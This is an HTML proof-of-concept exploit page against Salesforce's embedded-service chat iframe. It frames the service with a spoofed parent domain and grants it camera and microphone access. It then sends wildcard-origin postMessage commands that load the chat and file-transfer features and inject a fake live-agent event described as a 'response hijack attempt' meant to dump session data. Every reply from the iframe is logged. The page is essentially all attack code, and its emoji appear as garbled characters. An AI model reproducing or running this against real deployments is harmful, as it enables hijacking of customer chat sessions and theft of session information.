<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Salesforce PoC - Chasitor Interaction</title>
  <style>
    iframe { width: 100%; height: 500px; border: 1px solid #ccc; }
    body { font-family: monospace; padding: 10px; }
  </style>
</head>
<body>
  <h3>[+] Salesforce iframe interaction PoC</h3>
  <iframe id="eswFrame"
          src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.wangdubruh.xyz"
          allow="camera *; microphone *;"
          onload="onIframeLoad()"></iframe>

  <script>
    const iframe = document.getElementById('eswFrame');
    let once = false;

    // Listen for messages FROM Salesforce iframe
    window.addEventListener("message", (e) => {
      const msg = e.data;
      if (typeof msg === 'object') {
        console.log("ðŸ“© Message from iframe:", msg);
      }
    });

    // Called when iframe is loaded
    function onIframeLoad() {
      console.log("[+] Iframe loaded (Salesforce 4.0)");

      // Load features
      postMessageToIframe({ method: "script.load", feature: "chasitor" });
      postMessageToIframe({ method: "script.load", feature: "filetransfer" });

      // Delay before sending fake event to dump session info
      setTimeout(() => {
        console.log("ðŸ“¤ Sending fake liveagent.event to iframe");
        postMessageToIframe({
          method: "liveagent.event",
          data: {
            event: "chasitorDataDump",
            params: { key: "POC", value: "response hijack attempt" }
          }
        });
      }, 2000);
    }

    function postMessageToIframe(message) {
      iframe.contentWindow.postMessage(message, "*");
    }
  </script>
</body>
</html>
